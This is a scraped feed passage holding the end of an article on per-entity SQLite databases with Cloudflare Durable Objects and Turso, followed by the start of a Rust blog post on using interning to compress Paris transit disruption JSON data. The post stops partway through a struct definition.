<p><a href="https://developers.cloudflare.com/durable-objects/get-started/tutorial-with-sql-api/">Cloudflare Durable Objects</a> and <a href="https://turso.tech/">Turso</a> demonstrate how SQLite will change how hyper-scale applications may be architected in the future.</p>
<p>These databases provide:</p>
<ul>
<li><strong>Dynamic scaling</strong>: Instantly provision databases per entity, reducing infrastructure complexity.</li>
<li><strong>Infinite, cheap databases</strong>: Similar to partitions, you can spawn an infinite number of SQLite databases because they are incredibly cheap to create &amp; manage.</li>
<li><strong>Global distribution</strong>: Databases are placed closer to users, improving query performance.</li>
<li><strong>Built-in replication and durability</strong>: Unlike traditional SQLite, these services replicate data across multiple regions for high availability.</li>
</ul>

<img loading="lazy" width="1674" height="2172" decoding="async" data-nimg="1" src="https://rivet.gg/_next/static/media/sqlite-hyperscale.94d4d0af.png">
<p>Using SQLite with Cloudflare Durable Objects &amp; Turso allows defining databases per entity, effectively replacing partitioning keys.</p>
<p>Instead of storing chat logs in a single partition, each chat channel can have its own SQLite database that also includes more tables, like participants and reactions. A sample schema could look like this:</p>

<p>From Cloudflare Durable Objects or Turso, this SQLite partition database could be queried like this:</p>


<ul>
<li><strong>Local ACID transactions</strong>: Complex SQL queries can be within each partition without cross-partition complexities.</li>
<li><strong>Efficient I/O</strong>: SQLite enables performing complex queries within the partition with very high performance.</li>
<li><strong>Leverage existing SQLite extensions</strong>: SQLite has a rich ecosystem of existing extensions, such as <a href="https://www.sqlite.org/fts5.html">FTS5</a>, <a href="https://www.sqlite.org/json1.html">JSON1</a>, <a href="https://www.sqlite.org/rtree.html">R*Tree</a>, and <a href="https://www.gaia-gis.it/fossil/libspatialite/index">SpatiaLite</a>.</li>
<li><strong>Full Power of SQL migrations</strong>: SQLite provides the full power of SQL migrations &amp; leveraging existing migrations tools such as Drizzle &amp; Prisma.</li>
<li><strong>Lazy schema migrations</strong>: Changing schema is tricky at scale. Assuming your migrations are lightweight, they can be executed on demand after the SQLite database is opened at the cost of a slightly higher p99 after deploys.</li>
</ul>

<hr>
<p>Despite its benefits, SQLite at scale presents a few challenges:</p>
<ul>
<li>Lack of an open-source, self-hosted solution.</li>
<li>No built-in cross-database querying, making complex analytics difficult without a dedicated data lake.</li>
<li>Limited database tooling, such as SQL browsers, ETL pipelines, monitoring, and backups. <a href="https://starbasedb.com/">StarbaseDB</a> is addressing this for Cloudflare Durable Objects with SQLite.</li>
<li>Non-standard protocols for communicating with SQLite-on-the-server. In contrast, PostgreSQL, MySQL, and Cassandra all have a well standardized wire protocols across all cloud providers that has led to a rich community of tools.</li>
<li>There are no case studies like Cassandra &amp; DynamoDB have of using SQLite with this architecture at hyper-scale. This will change with time.</li>
</ul>

<hr>
<p>SQLite on the server is more than a lightweight solution for small deployments – it's an increasingly viable alternative to traditional partitioned databases. By leveraging SQLite-per-partition solutions like Turso and Durable Objects, developers gain rich SQL capabilities, ACID compliance, and significant operational advantages.</p></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The power of interning: making a time series database 2000x smaller in Rust (179 pts)]]></title>
            <link>https://gendignoux.com/blog/2025/03/03/rust-interning-2000x.html</link>
            <guid>43243914</guid>
            <pubDate>Mon, 03 Mar 2025 17:03:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gendignoux.com/blog/2025/03/03/rust-interning-2000x.html">https://gendignoux.com/blog/2025/03/03/rust-interning-2000x.html</a>, See on <a href="https://news.ycombinator.com/item?id=43243914">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
    <header>
        
        <p>
            <a href="https://gendignoux.com/blog/tags.html#rust"> rust</a><a href="https://gendignoux.com/blog/tags.html#perf"> perf</a><a href="https://gendignoux.com/blog/tags.html#json"> json</a>
        </p>
        <p>March 3, 2025</p>
        <p>by <span>Guillaume Endignoux</span>
        <br>
            <a href="https://infosec.exchange/@gendx" target="_blank"> @gendx</a> | <a href="https://gendignoux.com/blog/feed.xml"> RSS</a>
        </p>
    </header>
    <section>
        <p>This week-end project started by browsing the <a href="https://prim.iledefrance-mobilites.fr/en">open-data repository</a> of Paris’ public transport network, which contains <a href="https://prim.iledefrance-mobilites.fr/en/catalogue-data?type=api">various APIs</a> to query <a href="https://prim.iledefrance-mobilites.fr/en/apis/idfm-ivtr-requete_globale">real-time departures</a>, <a href="https://prim.iledefrance-mobilites.fr/en/apis/idfm-disruptions_bulk">current disruptions</a>, etc.
The <a href="https://prim.iledefrance-mobilites.fr/en/reutilisations">data reuse section</a> caught my eye, as it features external projects that use this open data.
In particular, the <a href="https://ratpstatus.fr/">RATP status website</a> provides a really nice interface to visualize historical disruptions on metro, RER/train and tramway lines.</p>

<!--more-->

<p><a href="https://gendignoux.com/blog/images/rust-interning-2000x/ratp-status-2025-01-28.aUIZIqVMnogK.png"><img src="https://gendignoux.com/blog/images/rust-interning-2000x/ratp-status-2025-01-28.BnEKVNacK-tC.webp" width="2559" height="1251" loading="lazy" alt="Screenshot of the RATP status website"></a>
A usual day of disruptions on <a href="https://ratpstatus.fr/">ratpstatus.fr</a>.</p>

<p>Under the hood, the <a href="https://github.com/wincelau/ratpstatus">ratpstatus.fr GitHub repository</a> contains <a href="https://github.com/wincelau/ratpstatus/tree/main/datas">all the JSON files</a> queried from the open-data API, every 2 minutes for almost a year now.
A repository with 188K commits and more than 10 GB of accumulated data at the last commit alone (as measured by <code>git clone --depth=1</code>) is definitely an interesting database choice!
To be clear, this post isn’t in any way a critique of that.
RATP status is an excellent website providing useful information that runs blazingly fast<sup id="fnref:1"><a href="#fn:1" rel="footnote" role="doc-noteref">1</a></sup> and smoothly without the usual bloat you see on the web nowadays.</p>

<p>Nonetheless, the 10 GB of data got me to wonder: can we compress that better, by spending a reasonable amount of time (i.e. a week-end project)?
In this deep dive post, I’ll explain how I used the <a href="https://en.wikipedia.org/wiki/Interning_(computer_science)"><em>interning</em> design pattern</a> in Rust to compress this data set by a factor of two thousand!
We’ll investigate how to best structure the interner itself, how to tune our data schema to work well with it, and likewise how serialization can best leverage interning.</p>

<p>If you’ve got lots of JSON files accumulating in your storage, you should read on!</p>

<hr>

<ul id="markdown-toc">
  <li><a href="#importing-the-data-135" id="markdown-toc-importing-the-data-135">Importing the data (135%)</a></li>
  <li><a href="#interning" id="markdown-toc-interning">Interning</a>    <ul>
      <li><a href="#strings-47" id="markdown-toc-strings-47">Strings (47%)</a></li>
      <li><a href="#arbitrary-types-76" id="markdown-toc-arbitrary-types-76">Arbitrary types (7.6%)</a></li>
      <li><a href="#dropping-the-reference-28" id="markdown-toc-dropping-the-reference-28">Dropping the reference (2.8%)</a></li>
    </ul>
  </li>
  <li><a href="#tuning-the-schema" id="markdown-toc-tuning-the-schema">Tuning the schema</a>    <ul>
      <li><a href="#sorting-sets-15" id="markdown-toc-sorting-sets-15">Sorting sets (1.5%)</a></li>
      <li><a href="#using-enums-14" id="markdown-toc-using-enums-14">Using enums (1.4%)</a></li>
      <li><a href="#splitting-structs-082" id="markdown-toc-splitting-structs-082">Splitting structs (0.82%)</a></li>
      <li><a href="#specializing-types-064" id="markdown-toc-specializing-types-064">Specializing types (0.64%)</a></li>
    </ul>
  </li>
  <li><a href="#serialization" id="markdown-toc-serialization">Serialization</a>    <ul>
      <li><a href="#writing-custom-deserializers-with-serde-029" id="markdown-toc-writing-custom-deserializers-with-serde-029">Writing custom (de)serializers with Serde (0.29%)</a></li>
      <li><a href="#compression-and-fighting-the-rust-borrow-checker-linux-pipes-005" id="markdown-toc-compression-and-fighting-the-rust-borrow-checker-linux-pipes-005">Compression and fighting <del>the Rust borrow checker</del> Linux pipes (0.05%)</a></li>
      <li><a href="#tuple-encoding" id="markdown-toc-tuple-encoding">Tuple encoding</a></li>
      <li><a href="#optimizing-sets-revisited" id="markdown-toc-optimizing-sets-revisited">Optimizing sets revisited</a></li>
    </ul>
  </li>
  <li><a href="#final-result-a-lightweight-append-only-database" id="markdown-toc-final-result-a-lightweight-append-only-database">Final result: a lightweight append-only database</a></li>
</ul>

<h2 id="importing-the-data-135"><span><a href="#importing-the-data-135"></a></span>Importing the data (135%)</h2>

<p>The first step of this experiment was to import the source data.
To give a bit more context, each data point was a JSON file with many entries looking like this.</p>

<div><pre><code><span>{</span><span>
  </span><span>"disruptions"</span><span>:</span><span> </span><span>[</span><span>
    </span><span>{</span><span>
      </span><span>"id"</span><span>:</span><span> </span><span>"445a6032-d1ca-11ef-b3f5-0a58a9feac02"</span><span>,</span><span>
      </span><span>"applicationPeriods"</span><span>:</span><span> </span><span>[</span><span>
        </span><span>{</span><span>
          </span><span>"begin"</span><span>:</span><span> </span><span>"20250113T180000"</span><span>,</span><span>
          </span><span>"end"</span><span>:</span><span> </span><span>"20250228T230000"</span><span>
        </span><span>}</span><span>
      </span><span>],</span><span>
      </span><span>"lastUpdate"</span><span>:</span><span> </span><span>"20250113T172013"</span><span>,</span><span>
      </span><span>"cause"</span><span>:</span><span> </span><span>"PERTURBATION"</span><span>,</span><span>
      </span><span>"severity"</span><span>:</span><span> </span><span>"BLOQUANTE"</span><span>,</span><span>
      </span><span>"title"</span><span>:</span><span> </span><span>"Activities in Aincourt"</span><span>,</span><span>
      </span><span>"message"</span><span>:</span><span> </span><span>"&lt;p&gt;Due to work in Aincourt, the Centre and Eglise stops will not be served in both directions of traffic on line 95 15 and in the direction of Magny en Vexin Gare Routière only on line 95 44. &lt;br&gt;From 13/01 until further notice. &lt;/p&gt;&lt;br&gt;Please refer to Les Cadenas stops"</span><span>
    </span><span>},</span><span>
  </span><span>...</span><span>
</span><span>}</span><span>
</span></code></pre></div>

<p>Let’s import this data into our program!
If you’re not familiar with <a href="https://www.rust-lang.org/">Rust</a>, this programming language makes it very easy to deserialize data from all sorts of formats via libraries like <a href="https://docs.rs/serde/"><code>serde</code></a> and <a href="https://docs.rs/serde_json/"><code>serde_json</code></a>.
I’m depending on the following versions in my <a href="https://doc.rust-lang.org/cargo/reference/manifest.html"><code>Cargo.toml</code> manifest</a>.</p>

<div><pre><code><span>[dependencies]</span>
<span>serde</span> <span>=</span> <span>{</span> <span>version</span> <span>=</span> <span>"1.0.217"</span><span>,</span> <span>features</span> <span>=</span> <span>[</span><span>"derive"</span><span>]</span> <span>}</span>
<span>serde_json</span> <span>=</span> <span>"1.0.137"</span>
</code></pre></div>

<p>With that, we can define a data schema as regular Rust structs/enums and simply annotate them with <code>serde</code>’s <a href="https://docs.rs/serde/1.0.217/serde/derive.Deserialize.html"><code>Deserialize</code> derive macro</a> to automatically implement deserialization for it.
I recommend using the <a href="https://serde.rs/container-attrs.html#deny_unknown_fields"><code>deny_unknown_fields</code> attribute</a> to make sure unknown JSON fields aren’t silently ignored.
These attributes are documented separately on the <a href="https://serde.rs/attributes.html">serde.rs website</a> (not on <a href="https://docs.rs/serde/">docs.rs</a>).</p>

<div><pre><code><span>use</span> <span>serde</span><span>::</span><span>Deserialize</span><span>;</span>

<span>#[derive(Debug,</span> <span>Deserialize)]</span>
<span>#[serde(deny_unknown_fields)]</span>
<span>struct</span> <span>Data</span> <span>{</span>
    <span>#[serde(rename</span> <span>=</span> <span>"statusCode"</span><span>)]</span>
    <span>status_code</span><span>:</span> <span>Option</span><span>&lt;</span><span>i32</span><span>&gt;</span><span>,</span>
    <span>error</span><span>:</span> <span>Option</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span>
    <span>message</span><span>:</span> <span>Option</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span>
    <span>disruptions</span><span>:</span> <span>Option</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>Disruption</span><span>&gt;&gt;</span><span>,</span>
    <span>lines</span><span>:</span> <span>Option</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>Line</span><span>&gt;&gt;</span><span>,</span>
    <span>#[serde(rename</span> <span>=</span> <span>"lastUpdatedDate"</span><span>)]</span>
    <span>last_updated_date</span><span>:</span> <span>Option</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>One can then trivially deserialize a JSON file into a <code>Data</code> struct with functions like <a href="https://docs.rs/serde_json/1.0.137/serde_json/fn.from_reader.html"><code>serde_json::from_reader()</code></a>.</p>

<div><pre><code><span>// Open a file for reading.</span>
<span>let</span> <span>file</span> <span>=</span> <span>File</span><span>::</span><span>open</span><span>(</span><span>path</span><span>)</span><span>?</span><span>;</span>
<span>// Add a layer of buffering for performance.</span>
<span>let</span> <span>reader</span> <span>=</span> <span>BufReader</span><span>::</span><span>new</span><span>(</span><span>file</span><span>);</span>
<span>// Deserialize the JSON contents into a Data.</span>
<span>let</span> <span>data</span><span>:</span> <span>Data</span> <span>=</span> <span>serde_json</span><span>::</span><span>from_reader</span><span>(</span><span>reader</span><span>)</span><span>?</span><span>;</span>
</code></pre></div>

<p>To give more details about the specific data schema I’m importing, each <code>Disruption</code> contains informative fields, as well as a list of time periods during which it applies.
For example, there may be construction work on a line every evening for a month, so there would be an <code>ApplicationPeriod</code> for each of these evenings.</p>

<div><pre><code><span>#[derive(Debug,</span> <span>Deserialize)]</span>
<span>#[serde(deny_unknown_fields)]</span>
<span>struct</span> <span>Disruption</span> <span>{</span>
    <span>id</span><span>:</span> <span>String</span><span>,</span>
    <span>#[serde(rename</span> <span>=</span> <span>"applicationPeriods"</span><span>)]</span>
    <span>application_periods</span><span>:</span> <span>Vec</span><span>&lt;</span><span>ApplicationPeriod</span><span>&gt;</span><span>,</span>
    <span>#[serde(rename</span> <span>=</span> <span>"lastUpdate"</span><span>)]</span>
    <span>last_update</span><span>:</span> <span>String</span><span>,</span>
    <span>cause</span><span>:</span> <span>String</span><span>,</span>
    <span>severity</span><span>:</span> <span>String</span><span>,</span>
    <span>tags</span><span>:</span> <span>Option</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>String</span><span>&gt;&gt;</span><span>,</span>
    <span>title</span><span>:</span> <span>String</span><span>,</span>
    <span>message</span><span>:</span> <span>String</span><span>,</span>
    <span>disruption_id</span><span>:</span> <span>Option</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>#[derive(Debug,</span> <span>Deserialize)]</span>
<span>#[serde(deny_unknown_fields)]</span>
<span>struct</span> <span>ApplicationPeriod</span> <span>{</span>
    <span>begin</span><span>:</span> <span>String</span><span>,</span>
    <span>end</span><span>:</span> <span>String</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>The data also contains an index by <code>Line</code>s, listing all the objects (e.g. stations) impacted by disruptions on each metro line.</p>

<div id="schema-line"><pre><code><span>#[derive(Debug,</span> <span>Deserialize)]</span>
<span>#[serde(deny_unknown_fields)]</span>
<span>struct</span> <span>Line</span> <span>{</span>
    <span>id</span><span>:</span> <span>String</span><span>,</span>
    <span>name</span><span>:</span> <span>String</span><span>,</span>
    <span>#[serde(rename</span> <span>=</span> <span>"shortName"</span><span>)]</span>
    <span>short_name</span><span>:</span> <span>String</span><span>,</span>
    <span>mode</span><span>:</span> <span>String</span><span>,</span>
    <span>#[serde(rename</span> <span>=</span> <span>"networkId"</span><span>)]</span>
    <span>network_id</span><span>:</span> <span>String</span><span>,</span>
    <span>#[serde(rename</span> <span>=</span> <span>"impactedObjects"</span><span>)]</span>
    <span>impacted_objects</span><span>:</span> <span>Vec</span><span>&lt;</span><span>ImpactedObject</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>#[derive(Debug,</span> <span>Deserialize)]</span>
<span>#[serde(deny_unknown_fields)]</span>
<span>struct</span> <span>ImpactedObject</span> <span>{</span>
    <span>#[serde(rename</span> <span>=</span> <span>"type"</span><span>)]</span>
    <span>typ</span><span>:</span> <span>String</span><span>,</span>
    <span>id</span><span>:</span> <span>String</span><span>,</span>
    <span>name</span><span>:</span> <span>String</span><span>,</span>
    <span>#[serde(rename</span> <span>=</span> <span>"disruptionIds"</span><span>)]</span>
    <span>disruption_ids</span><span>:</span> <span>Vec</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>Lastly, I wanted to estimate how much space these objects take in memory, in order to benchmark the improvements obtained by interning methods.
Rust’s <a href="https://doc.rust-lang.org/std/mem/fn.size_of.html"><code>std::mem::size_of()</code> function</a> returns the “stack” size of an object, but that’s not sufficient as it ignores any data indirectly allocated on the heap (such as via a <a href="https://doc.rust-lang.org/std/vec/struct.Vec.html"><code>Vec</code></a> collection).
Therefore, I defined a new trait and implemented it for the needed types.</p>

<div><pre><code><span>trait</span> <span>EstimateSize</span><span>:</span> <span>Sized</span> <span>{</span>
    <span>/// Returns the number of bytes indirectly allocated on the heap by this object.</span>
    <span>fn</span> <span>allocated_bytes</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span><span>;</span>

    <span>/// Returns the total number of bytes that this object uses.</span>
    <span>fn</span> <span>estimated_bytes</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span>
        <span>std</span><span>::</span><span>mem</span><span>::</span><span>size_of</span><span>::</span><span>&lt;</span><span>Self</span><span>&gt;</span><span>()</span> <span>+</span> <span>self</span><span>.allocated_bytes</span><span>()</span>
    <span>}</span>
<span>}</span>

<span>impl</span> <span>EstimateSize</span> <span>for</span> <span>i32</span> <span>{</span>
    <span>fn</span> <span>allocated_bytes</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span>
        <span>0</span>  <span>// Nothing allocated on the heap.</span>
    <span>}</span>
<span>}</span>

<span>impl</span> <span>EstimateSize</span> <span>for</span> <span>String</span> <span>{</span>
    <span>fn</span> <span>allocated_bytes</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span>
        <span>self</span><span>.len</span><span>()</span>  <span>// Each item is one byte long. Ignores the string capacity.</span>
    <span>}</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>:</span> <span>EstimateSize</span><span>&gt;</span> <span>EstimateSize</span> <span>for</span> <span>Vec</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>allocated_bytes</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span>
        <span>// Recursively sum each item's total size.</span>
        <span>self</span><span>.iter</span><span>()</span><span>.map</span><span>(|</span><span>x</span><span>|</span> <span>x</span><span>.estimated_bytes</span><span>())</span><span>.sum</span><span>()</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>For compound types (structs), the implementation visits all the fields.
In principle, this could automatically be implemented by a <a href="https://doc.rust-lang.org/reference/procedural-macros.html#derive-macros">derive macro</a> (like serde’s <code>Deserialize</code>), but creating a new macro seemed overkill given the scale of my experiment.</p>

<div><pre><code><span>impl</span> <span>EstimateSize</span> <span>for</span> <span>Data</span> <span>{</span>
    <span>fn</span> <span>allocated_bytes</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span>
        <span>self</span><span>.status_code</span><span>.allocated_bytes</span><span>()</span>
            <span>+</span> <span>self</span><span>.error</span><span>.allocated_bytes</span><span>()</span>
            <span>+</span> <span>self</span><span>.message</span><span>.allocated_bytes</span><span>()</span>
            <span>+</span> <span>self</span><span>.disruptions</span><span>.allocated_bytes</span><span>()</span>
            <span>+</span> <span>self</span><span>.lines</span><span>.allocated_bytes</span><span>()</span>
            <span>+</span> <span>self</span><span>.last_updated_date</span><span>.allocated_bytes</span><span>()</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>With that, reading all the files from May 2024 gave the following result: expanding the 1.1 GB of JSON files into in-memory structs increased the size by 35% (commit <a href="https://github.com/gendx/rust-interning/commit/d961e6e5f0cce53c2b328a7fd70482811e80f26e">d961e6e</a>).
Not in the right direction… let’s start optimizing!</p>

<div><pre><code>Parsed 1137178883 bytes from 30466 files (+ 21 failed files)
Expanded to 1531039733 bytes in memory (relative size = 134.63%)
</code></pre></div>

<h2 id="interning"><span><a href="#interning"></a></span>Interning</h2>

<p>In this section, I’ll present the basics of the interning pattern, and how to apply it to various types.</p>

<h3 id="strings-47"><span><a href="#strings-47"></a></span>Strings (47%)</h3>

<p>The first use case that comes to mind in terms of interning is strings, as evidenced by the <a href="https://lib.rs/keywords/interning">top Rust interning libraries</a>.
We’re not going to use any of these packages, as my goal was to learn more about the inner details of interning.</p>

<p>I stumbled upon a blog post by <em>matklad</em> from 2020 titled <a href="https://matklad.github.io/2020/03/22/fast-simple-rust-interner.html"><em>Fast and Simple Rust Interner</em></a>, and my first iteration is inspired by this design.
The main difference is that I wrapped strings into an <a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc</code></a> (reference-counted wrapper) to avoid duplicating them in memory.
If the interner is intended to be used from multiple threads, I’d use an <a href="https://doc.rust-lang.org/std/sync/struct.Arc.html"><code>Arc</code></a> instead, but I’m keeping things simple for this experiment.</p>

<p>So what is an interner?
It’s essentially a table of strings, consisting of a vector of strings paired with a hash map that allows looking up if a string is already in the database, and if so at which index in the vector.</p>

<div><pre><code><span>use</span> <span>std</span><span>::</span><span>collections</span><span>::</span><span>HashMap</span><span>;</span>
<span>use</span> <span>std</span><span>::</span><span>rc</span><span>::</span><span>Rc</span><span>;</span>

<span>#[derive(Default)]</span>
<span>struct</span> <span>StringInternerImpl</span> <span>{</span>
    <span>vec</span><span>:</span> <span>Vec</span><span>&lt;</span><span>Rc</span><span>&lt;</span><span>String</span><span>&gt;&gt;</span><span>,</span>
    <span>map</span><span>:</span> <span>HashMap</span><span>&lt;</span><span>Rc</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span> <span>usize</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>impl</span> <span>StringInternerImpl</span> <span>{</span>
    <span>fn</span> <span>intern</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>value</span><span>:</span> <span>String</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span>
        <span>if</span> <span>let</span> <span>Some</span><span>(</span><span>&amp;</span><span>id</span><span>)</span> <span>=</span> <span>self</span><span>.map</span><span>.get</span><span>(</span><span>&amp;</span><span>value</span><span>)</span> <span>{</span>
            <span>return</span> <span>id</span><span>;</span>
        <span>}</span>

        <span>let</span> <span>id</span> <span>=</span> <span>self</span><span>.vec</span><span>.len</span><span>();</span>
        <span>let</span> <span>rc</span><span>:</span> <span>Rc</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>=</span> <span>Rc</span><span>::</span><span>new</span><span>(</span><span>value</span><span>);</span>
        <span>self</span><span>.vec</span><span>.push</span><span>(</span><span>Rc</span><span>::</span><span>clone</span><span>(</span><span>&amp;</span><span>rc</span><span>));</span>
        <span>self</span><span>.map</span><span>.insert</span><span>(</span><span>rc</span><span>,</span> <span>id</span><span>);</span>
        <span>id</span>
    <span>}</span>

    <span>fn</span> <span>lookup</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>id</span><span>:</span> <span>usize</span><span>)</span> <span>-&gt;</span> <span>Rc</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>{</span>
        <span>Rc</span><span>::</span><span>clone</span><span>(</span><span>&amp;</span><span>self</span><span>.vec</span><span>[</span><span>id</span><span>])</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>An interned string is then an index in the interner table.
The main advantage of this setup is to reduce the amount of memory used by the program, because an integer index is usually smaller than the full string.
This is especially effective when there are many repeated strings.</p>

<p><a href="https://gendignoux.com/blog/images/rust-interning-2000x/string-interning.lrRCNfxir2Qy.svg"><img src="https://gendignoux.com/blog/images/rust-interning-2000x/string-interning.lrRCNfxir2Qy.svg" width="744" height="440" loading="lazy" alt="Memory layout of strings without and with interning"></a>
Memory layout of strings without and with interning.</p>

<p>There are several possible designs to represent an interned string object: as a first iteration I’ve chosen to pair the index with a reference to the interner that contains it.</p>

<div><pre><code><span>struct</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span>
    <span>interner</span><span>:</span> <span>&amp;</span><span>'a</span> <span>StringInterner</span><span>,</span>
    <span>id</span><span>:</span> <span>usize</span><span>,</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>from</span><span>(</span><span>interner</span><span>:</span> <span>&amp;</span><span>'a</span> <span>StringInterner</span><span>,</span> <span>value</span><span>:</span> <span>String</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>let</span> <span>id</span> <span>=</span> <span>interner</span><span>.intern</span><span>(</span><span>value</span><span>);</span>
        <span>Self</span> <span>{</span> <span>interner</span><span>,</span> <span>id</span> <span>}</span>
    <span>}</span>

    <span>fn</span> <span>lookup</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>Rc</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>{</span>
        <span>self</span><span>.interner</span><span>.lookup</span><span>(</span><span>self</span><span>.id</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>At this point, you might have noticed that I’ve declared <code>StringInterner</code> and <code>StringInternerImpl</code> types.
What’s the difference?</p>

<p>The answer is that once an <code>IString</code> captures an interner handle <code>&amp;StringInterner</code>, the underlying <code>StringInterner</code> cannot be mutated anymore via an <code>intern()</code> function taking a <code>&amp;mut self</code> parameter, as it would break <a href="https://doc.rust-lang.org/rust-by-example/scope/borrow/alias.html">Rust’s aliasing rules</a>: there cannot be both a <code>&amp;StringInterner</code> and a <code>&amp;mut StringInterner</code> pointing to the same thing at the same time.
This is quite unfortunate, as it prevents interning more than one string!</p>

<p>The way to resolve this conflict is to use <a href="https://doc.rust-lang.org/reference/interior-mutability.html"><em>interior mutability</em></a> via the <a href="https://doc.rust-lang.org/std/cell/struct.RefCell.html"><code>RefCell</code> type</a>.
By defining a <code>StringInterner</code> as a <code>RefCell&lt;StringInternerImpl&gt;</code>, we can intern more values without needing a <code>&amp;mut self</code> reference to the interner.</p>

<div><pre><code><span>#[derive(Default)]</span>
<span>struct</span> <span>StringInterner</span> <span>{</span>
    <span>inner</span><span>:</span> <span>RefCell</span><span>&lt;</span><span>StringInternerImpl</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>impl</span> <span>StringInterner</span> <span>{</span>
    <span>// This function takes an immutable reference!</span>
    <span>fn</span> <span>intern</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>value</span><span>:</span> <span>String</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span>
        <span>// The borrow_mut() method performs runtime checks and releases a</span>
        <span>// mutable reference if it's safe to do so (or panics).</span>
        <span>self</span><span>.inner</span><span>.borrow_mut</span><span>()</span><span>.intern</span><span>(</span><span>value</span><span>)</span>
    <span>}</span>

    <span>fn</span> <span>lookup</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>id</span><span>:</span> <span>usize</span><span>)</span> <span>-&gt;</span> <span>Rc</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>{</span>
        <span>self</span><span>.inner</span><span>.borrow</span><span>()</span><span>.lookup</span><span>(</span><span>id</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>With this setup, we can for example overload the comparison operator <code>==</code> to directly compare interned strings with regular strings.</p>

<div><pre><code><span>impl</span> <span>PartialEq</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>for</span> <span>IString</span><span>&lt;</span><span>'_</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>eq</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>other</span><span>:</span> <span>&amp;</span><span>String</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
        <span>self</span><span>.lookup</span><span>()</span><span>.deref</span><span>()</span> <span>==</span> <span>other</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>Lastly, I’ve defined new structs for the data schema using the interned string type in place of all strings.
This means adding a lifetime <code>'a</code> everywhere, which isn’t quite ergonomic, but we’ll revisit this pattern <a href="#dropping-the-reference-28">later</a>.</p>

<div><pre><code><span>struct</span> <span>Disruption</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span>
    <span>id</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>application_periods</span><span>:</span> <span>Vec</span><span>&lt;</span><span>ApplicationPeriod</span><span>&lt;</span><span>'a</span><span>&gt;&gt;</span><span>,</span>
    <span>last_update</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>cause</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>severity</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>tags</span><span>:</span> <span>Option</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>IString</span><span>&lt;</span><span>'a</span><span>&gt;&gt;&gt;</span><span>,</span>
    <span>title</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>message</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>disruption_id</span><span>:</span> <span>Option</span><span>&lt;</span><span>IString</span><span>&lt;</span><span>'a</span><span>&gt;&gt;</span><span>,</span>
<span>}</span>

<span>struct</span> <span>ApplicationPeriod</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span>
    <span>begin</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>end</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
